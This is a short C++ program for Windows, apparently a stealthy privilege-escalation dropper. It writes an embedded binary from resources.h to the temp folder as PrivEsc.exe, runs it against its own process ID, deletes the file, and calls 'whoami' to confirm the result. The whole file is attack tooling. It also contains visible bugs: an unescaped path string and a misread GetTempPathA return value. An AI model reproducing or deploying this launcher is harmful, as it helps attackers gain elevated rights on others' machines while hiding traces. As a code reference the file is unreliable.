#include <iostream>
#include <Windows.h>
#include "resources.h"
#define INSTALLER_NAME "StealthInstaller.exe"
#define PRIVESC_NAME "PrivEsc.exe"
char TemporaryPath[MAX_PATH + sizeof(INSTALLER_NAME) + 1] = { 0 };


DWORD PrivilegeEscalate() {
    char StringOfPID[10] = { 0 };
    DWORD BytesWritten = 0;
    HANDLE TestFile = CreateFileA("C:\testfile.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (TestFile == INVALID_HANDLE_VALUE) {
        return GetLastError();
    }
    CloseHandle(TestFile);
    DWORD LastError = GetTempPathA(MAX_PATH + sizeof(PRIVESC_NAME) + 1, TemporaryPath);
    if (LastError != ERROR_SUCCESS) {
        return LastError;
    }
    std::string TemporaryFile(TemporaryPath + std::string(PRIVESC_NAME));
    DWORD ProcessId = GetCurrentProcessId();
    if (ProcessId == 0) {
        return GetLastError();
    }
    _itoa_s(ProcessId, StringOfPID, 10);
    HANDLE EscalateFile = CreateFileA(TemporaryFile.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (EscalateFile == INVALID_HANDLE_VALUE) {
        return GetLastError();
    }
    if (!WriteFile(EscalateFile, PrivilegeEscalation, sizeof(PrivilegeEscalation), &BytesWritten, NULL)) {
        CloseHandle(EscalateFile);
        return GetLastError();
    }
    CloseHandle(EscalateFile);
    std::string EscalateCommand(TemporaryFile + std::string(" ") + std::string(StringOfPID));
    system(EscalateCommand.c_str());
    DeleteFileA(TemporaryFile.c_str());
    return GetLastError();
}


int main() {
    PrivilegeEscalate();
    system("whoami");
    std::cout << "Hello World!\n";
}

